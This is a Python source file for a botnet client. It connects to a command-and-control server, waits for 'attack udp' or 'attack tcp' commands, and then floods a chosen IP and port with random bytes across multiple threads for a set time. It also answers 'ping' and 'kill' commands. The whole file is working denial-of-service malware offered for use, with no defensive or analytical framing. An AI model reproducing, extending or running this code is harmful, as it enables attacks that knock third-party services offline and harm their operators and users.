import socket, signal
import threading
import sys, random
import linecache
import datetime
from typing import Tuple
from threading import Thread
from time import time, sleep

def PrintException():
    exc_type, exc_obj, tb = sys.exc_info()
    f = tb.tb_frame
    lineno = tb.tb_lineno
    filename = f.f_code.co_filename
    linecache.checkcache(filename)
    line = linecache.getline(filename, lineno, f.f_globals)
    print('EXCEPTION IN ({}, LINE {} "{}"): {}'.format(filename, lineno, line.strip(), exc_obj))



def attack_tcp(ip, port, sec, workers):
	endTime = datetime.datetime.now() + datetime.timedelta(minutes=sec)
	while True:
		if datetime.datetime.now() >= endTime:
			break
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try:
			s.connect((ip, port))
			while datetime.datetime.now() < endTime:
				print('attack sent')
				s.send(random._urandom(workers))
		except:
			print('attack passed')
			pass



class Client():
	run=False
	def __init__(self, connect:Tuple[str,int]=("127.0.0.1",9999)) -> None: #change local
		signal.signal(signal.SIGINT, self.exit_gracefully)
		signal.signal(signal.SIGTERM, self.exit_gracefully)
		self.stop = False
		self.run = False
		while not self.stop:
			try:
				self._connect(connect)
			except KeyboardInterrupt:
				continue
			except:
				sleep(10)
	def exit_gracefully(self,signum, frame):
		self.stop = True
		self.run = False
		self.sock.close()
		sleep(1)
		sys.exit(0)

	def _connect(self, connect:Tuple[str,int]) -> None:
		self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.sock.connect(connect)
		self.start()

	def __ddos(self,*args):

		def dos(*args):
			t1=time()
			host,port=args[1],args[2]

			s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

			bytes=random._urandom(10240)
			s.connect((host, int(port)))
			while self.run:
				if not self.run:break
				s.sendto(bytes, (host,int(port)))
				
			s.close()
			print("run time {}".format(time()-t1))
		for n in range(int(args[4])):
			Thread(target = dos,args=[*args]).start()
		sleep(int(args[3]))
		self.run=False

	def _recv(self):
		return self.sock.recv(1024).decode("ascii").lower()

	def start(self):
		while True:
			data = self._recv()
			if "attack" in data:
				if "udp" in data:
					data=data.replace("attack ","").split()
					print('UDP ATTACK STARTED')
					try:
						proto, ip, port, sec, workers = data
						data = proto, ip, int(port), int(sec), int(workers)
						self.sock.send("FINISHED UDP ATTACK".encode("ascii"))
					except Exception as e:
						print(e)
						self.sock.send("INVALID ATTACK SYNTAX".encode("ascii"))
						continue
					print('UDP ATTACK FINISHED')
					self.run=True
					Thread(target = self.__ddos,args=data).start()
				if "tcp" in data:
					print('TCP ATTACK STARTED')
					print()
					print()
					try:
						args = data.split(' ')
						ip = args[2]
						port = int(args[3])
						sec = int(args[4])
						workers = int(args[5])
						attack_tcp(ip, port, sec, workers)
					except:
						PrintException()
					print()
					print()
					print('TCP ATTACK FINISHED')
			elif "kill" in data:
				self.run=False
				self.sock.send(str.encode("CLOSED CLIENT"))
				sock.close()
			elif "ping" in data:
				self.sock.send(str.encode("ALIVE"))
			else:
				self.sock.send(str.encode("UNKNOWN COMMAND"))


if __name__ == '__main__':
	Client()
